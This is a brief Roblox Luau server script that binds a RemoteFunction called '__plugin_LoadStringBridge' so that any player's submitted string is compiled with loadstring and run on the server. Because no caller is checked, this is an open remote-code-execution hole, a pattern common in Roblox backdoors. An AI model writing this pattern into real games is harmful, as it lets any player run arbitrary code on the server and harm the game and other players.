local receive: RemoteFunction = game:GetService("ReplicatedStorage"):WaitForChild("__plugin_LoadStringBridge")
receive.OnServerInvoke = function(player: Player, code: string)
	print("Function called")
	return loadstring("return {" .. code .. "}")()
end
